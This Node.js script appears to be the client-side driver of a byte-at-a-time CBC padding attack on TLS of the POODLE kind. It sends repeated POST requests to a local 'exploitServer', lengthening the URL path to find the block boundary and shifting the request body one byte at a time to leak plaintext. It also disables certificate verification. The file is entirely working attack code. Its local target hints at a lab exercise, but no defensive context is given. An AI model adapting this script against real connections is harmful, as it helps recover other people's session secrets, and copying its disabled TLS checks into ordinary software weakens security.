const axios = require('axios').default;
const https = require('https');

let exploitServer = "https://localhost:9000"

var payload = ""
var garbage = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
var attack = 1
var i = 0
var payload_f = ""
var block_length = 16

const agent = new https.Agent({  
    rejectUnauthorized: false
  });
  

function reset() {
    payload = payload_f
    garbage = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
    i = 0
    console.log("reset")
}

function sendAttack() {
    if (block_length != 0) {
        axios.post(`${exploitServer}/${payload}`, garbage).then(sendAttacktHandler).catch(sendAttacktHandler)
        // var xhr = new XMLHttpRequest();
        // xhr.onreadystatechange = sendAttacktHandler;
        // xhr.open("POST", `${exploitServer}/${payload}`);
        // xhr.send(garbage);
    } else {
        console.log('Set the blocklength: 8 or 16')
    }
}

async function sendAttacktHandler() {
    console.log("FIND ONE BYTE", i, block_length, payload, garbage)
    if (i < (block_length - 1)) {
        i += 1
        payload += "a"
        garbage = garbage.substr(1);
        console.log("update", payload)
    } else {
        reset()
    }
    if (attack) {
        await sendAttack()
    }
}

function findlengthblock() {
    return axios.post(`${exploitServer}/${payload}`, garbage).then((res)=> {
        return sendRequestHandler2()
    }).catch(()=>{
        payload_f = payload
    })
    // var xhr = new XMLHttpRequest();
    // xhr.onreadystatechange = sendRequestHandler2;
    // xhr.open("POST", `${exploitServer}/${payload}`);
    // xhr.send(garbage);
}

async function sendRequestHandler2() {

    payload += "a"
    if (attack) {
        await findlengthblock()
    }
}


findlengthblock()
// sendAttack()